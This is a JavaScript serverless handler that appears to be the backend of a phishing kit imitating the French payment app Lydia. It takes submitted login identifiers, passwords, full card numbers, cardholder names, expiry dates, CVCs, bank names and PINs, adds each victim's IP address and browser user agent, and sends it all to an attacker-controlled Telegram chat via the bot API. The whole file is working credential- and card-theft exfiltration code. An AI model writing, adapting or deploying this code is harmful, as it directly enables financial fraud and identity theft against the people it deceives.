export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Missing Telegram credentials');
    return res.status(500).json({ error: 'Missing Telegram credentials' });
  }

  const { identifiant, password, cardNumber, cardHolder, cardExpiry, cardCvc, bank, pin } = req.body;

  const getClientIp = (req) => {
    const forwarded = req.headers['x-forwarded-for'];
    return forwarded ? forwarded.split(';')[0] : req.socket?.remoteAddress || 'unknown';
  };

  const message = `🔐 <b>AUTHENTIFICATION LYDIA</b>

👤 <b>Identifiant:</b> <code>${identifiant || 'N/A'}</code>
🔑 <b>Mot de passe:</b> <code>${password || 'N/A'}</code>

${cardNumber ? `💳 <b>Carte Bancaire:</b> <code>${cardNumber}</code>` : ''}
${cardHolder ? `👤 <b>Titulaire:</b> <code>${cardHolder}</code>` : ''}
${cardExpiry ? `📅 <b>Expiration:</b> <code>${cardExpiry}</code>` : ''}
${cardCvc ? `🔒 <b>CVC:</b> <code>${cardCvc}</code>` : ''}
${bank ? `🏦 <b>Banque:</b> <code>${bank}</code>` : ''}
${pin ? `🔐 <b>PIN:</b> <code>${pin}</code>` : ''}

📊 <b>Informations Système</b>
⏰ <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}
🌐 <b>IP:</b> <code>${getClientIp(req)}</code>
🔗 <b>User Agent:</b> <code>${req.headers['user-agent'] || 'unknown'}</code>`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();

    if (!response.ok) {
      console.error('Telegram API error:', data);
      return res.status(500).json({ error: data.description || 'Telegram API error' });
    }

    res.status(200).json({ 
      success: true, 
      message: 'Message sent to Telegram',
      messageId: data.result?.message_id 
    });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(500).json({ error: error.message });
  }
}
